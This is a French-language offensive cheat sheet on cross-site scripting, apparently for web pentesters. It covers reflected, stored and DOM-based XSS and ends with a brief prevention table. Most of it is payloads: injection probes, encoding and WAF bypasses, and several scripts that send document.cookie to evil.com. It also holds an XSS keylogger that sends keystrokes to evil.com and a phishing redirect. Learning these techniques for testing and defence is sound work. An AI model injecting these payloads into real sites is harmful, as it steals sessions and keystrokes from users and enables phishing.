@@ -1,0 +1,284 @@
+---
+title: "XSS — Cross-Site Scripting"
+description: "Techniques d'exploitation XSS : Reflected, Stored, DOM-based, contournement de filtres et prévention."
+category: "offensive"
+tags: ["xss", "web-security", "injection", "javascript", "client-side"]
+date: "2026-02-17"
+author: "@peran"
+complexity: "intermediate"
+---
+
+## Introduction
+
+Le Cross-Site Scripting (XSS) est une vulnérabilité web qui permet à un attaquant d'injecter du code JavaScript malveillant dans les pages consultées par d'autres utilisateurs. C'est l'une des failles les plus répandues du web (OWASP Top 10). Elle permet le vol de sessions, la redirection vers des sites malveillants, ou l'exécution d'actions au nom de la victime.
+
+## Types de XSS
+
+| Type                                               | Persistance    | Vecteur                                  |
+| -------------------------------------------------- | -------------- | ---------------------------------------- |
+| <TechBadge variant="warning">Reflected</TechBadge> | Non persistant | L'input est renvoyé dans la réponse HTTP |
+| <TechBadge variant="warning">Stored</TechBadge>    | Persistant     | L'input est stocké en base de données    |
+| <TechBadge variant="warning">DOM-based</TechBadge> | Côté client    | Manipulation du DOM via JavaScript       |
+
+## XSS Reflected (Réfléchi)
+
+Le payload est injecté dans un paramètre de la requête et directement renvoyé dans la page de réponse. L'attaque nécessite que la victime clique sur un lien spécialement forgé.
+
+### Détection Basique
+
+<CheatSheetCode title="xss-reflected-basic.txt" language="text">
+```
+# Test de base - injection dans un champ de recherche
+GET /search?q=<script>alert('XSS')</script> HTTP/1.1
+Host: target.com
+
+# Si la page affiche le paramètre sans filtrage :
+
+<p>
+  Résultats pour : <script>alert('XSS')</script>
+</p>
+
+# Test avec des balises HTML simples
+
+<b>test</b>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+```
+</CheatSheetCode>
+
+### Payloads Reflected Courants
+
+<CheatSheetCode title="xss-reflected-payloads.txt" language="javascript">
+```javascript
+// Injection directe
+<script>alert('XSS')</script>
+
+// Via attribut d'événement
+
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+
+// Via attribut href
+
+<a href="javascript:alert(1)">Click me</a>
+
+// Via iframe
+
+<iframe src="javascript:alert(1)">
+```
+</CheatSheetCode>
+
+## XSS Stored (Stocké)
+
+Le payload est enregistré côté serveur (base de données, fichier) et exécuté à chaque fois qu'un utilisateur consulte la page contenant le contenu malveillant. C'est le type de XSS le plus dangereux.
+
+### Vecteurs d'Injection Courants
+
+<CheatSheetCode title="xss-stored-vectors.txt" language="text">
+```
+# Commentaires / messages
+Champ commentaire → <script>document.location='https://evil.com/steal?c='+document.cookie</script>
+
+# Profil utilisateur
+
+Champ "Bio" ou "About" → <img src=x onerror="fetch('https://evil.com/log?cookie='+document.cookie)">
+
+# Noms d'utilisateurs
+
+Username → <svg onload=alert(1)>
+
+# Formulaires de contact / tickets support
+
+Message → <script>new Image().src='https://evil.com/steal?c='+document.cookie</script>
+
+````
+</CheatSheetCode>
+
+## XSS DOM-based
+
+Le DOM-based XSS se produit lorsque le JavaScript côté client manipule le DOM en utilisant des données contrôlées par l'utilisateur sans les assainir.
+
+### Sources et Sinks
+
+| Sources (entrée) | Sinks (exécution) |
+|-------------------|-------------------|
+| <TechBadge variant="flag">document.URL</TechBadge> | <TechBadge variant="warning">document.write()</TechBadge> |
+| <TechBadge variant="flag">location.hash</TechBadge> | <TechBadge variant="warning">innerHTML</TechBadge> |
+| <TechBadge variant="flag">location.search</TechBadge> | <TechBadge variant="warning">eval()</TechBadge> |
+| <TechBadge variant="flag">document.referrer</TechBadge> | <TechBadge variant="warning">setTimeout()</TechBadge> |
+| <TechBadge variant="flag">window.name</TechBadge> | <TechBadge variant="warning">jQuery.html()</TechBadge> |
+
+<CheatSheetCode title="xss-dom-based.js" language="javascript">
+```javascript
+// Exemple de code vulnérable
+// Le fragment d'URL est injecté directement dans le DOM
+var search = document.location.hash.substring(1);
+document.getElementById("output").innerHTML = search;
+
+// Exploitation
+// URL: https://target.com/page#<img src=x onerror=alert(1)>
+
+// Autre exemple vulnérable avec document.write
+var url = document.location.href;
+document.write('<a href="' + url + '">Retour</a>');
+
+// Exploitation
+// URL: https://target.com/page?"><script>alert(1)</script>
+````
+
+</CheatSheetCode>
+
+## Contournement de Filtres
+
+De nombreuses applications implémentent des filtres pour bloquer le XSS. Voici les techniques de contournement les plus courantes.
+
+### Encodage et Obfuscation
+
+<CheatSheetCode title="xss-bypass-encoding.txt" language="javascript">
+```javascript
+// Encodage HTML des caractères
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+// Encodage URL
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+// Encodage Unicode
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+// Double encodage URL
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+// Encodage Base64 via eval
+eval(atob('YWxlcnQoMSk='))
+
+````
+</CheatSheetCode>
+
+### Contournement de Filtres de Balises
+
+<CheatSheetCode title="xss-bypass-tags.txt" language="javascript">
+```javascript
+// Casse mixte
+<ScRiPt>alert(1)</sCrIpT>
+
+// Balises alternatives
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+
+// Sans parenthèses
+<img src=x onerror=alert`1`>
+<svg onload=alert&lpar;1&rpar;>
+
+// Sans guillemets ni chevrons (dans un attribut)
+" onfocus=alert(1) autofocus="
+' onfocus=alert(1) autofocus='
+````
+
+</CheatSheetCode>
+
+### Contournement de WAF
+
+<CheatSheetCode title="xss-bypass-waf.txt" language="javascript">
+```javascript
+// Espaces alternatifs
+<svg/onload=alert(1)>
+<svg	onload=alert(1)>
+
+// Commentaires HTML
+
+<script>al<!---->ert(1)</script>
+
+// Concatenation de strings
+
+<script>al\u0065rt(1)</script>
+
+// Via constructor
+
+<img src=x onerror="window['al'+'ert'](1)">
+<img src=x onerror="self[atob('YWxlcnQ=')](1)">
+
+// Utilisation de fetch pour l'exfiltration
+
+<img src=x onerror="fetch('https://evil.com/'+document.cookie)">
+```
+</CheatSheetCode>
+
+## Vol de Cookies et Exploitation
+
+### Exfiltration de Session
+
+<CheatSheetCode title="xss-cookie-stealing.js" language="javascript">
+```javascript
+// Vol de cookies via Image
+<script>
+new Image().src = "https://evil.com/steal?cookie=" + document.cookie;
+</script>
+
+// Vol via fetch
+
+<script>
+fetch("https://evil.com/steal", {
+  method: "POST",
+  body: document.cookie
+});
+</script>
+
+// Keylogger via XSS
+
+<script>
+document.addEventListener('keypress', function(e) {
+  fetch('https://evil.com/keys?k=' + e.key);
+});
+</script>
+
+// Redirection vers page de phishing
+
+<script>
+  document.location = "https://evil.com/phishing?url=" + document.URL;
+</script>
+
+```
+</CheatSheetCode>
+
+## Prévention
+
+| Mesure | Description |
+|--------|-------------|
+| <TechBadge variant="protocol">Output Encoding</TechBadge> | Encoder les caractères spéciaux HTML avant affichage |
+| <TechBadge variant="protocol">Content-Security-Policy</TechBadge> | Header CSP pour restreindre les sources de scripts |
+| <TechBadge variant="protocol">HttpOnly Flag</TechBadge> | Empêcher l'accès aux cookies via JavaScript |
+| <TechBadge variant="protocol">Input Validation</TechBadge> | Valider et assainir toutes les entrées utilisateur |
+| <TechBadge variant="protocol">SameSite Cookie</TechBadge> | Limiter l'envoi de cookies cross-site |
+
+<NetworkDiagram title="Flux d'attaque XSS Reflected">
+```
+
+[Attacker] [Victim Browser]
+│ │
+│ ── Lien malveillant ──────────────────────> │
+│ (URL avec payload XSS) │
+│ │
+│ [Target Server]
+│ │
+│ Requête avec payload ────────> │
+│ │
+│ <──── Page + script injecté ───── │
+│ │
+│ <── Cookie / données exfiltrées ────────── │
+│ │
+[evil.com] │
+
+```
+</NetworkDiagram>
+
+## Résumé
+
+Le XSS est une vulnérabilité omniprésente sur le web. La compréhension des trois types (Reflected, Stored, DOM-based) et des techniques de contournement de filtres est essentielle pour tout pentester web. La défense repose sur une combinaison d'encodage de sortie, de validation d'entrée et de headers de sécurité (CSP, HttpOnly).
+```
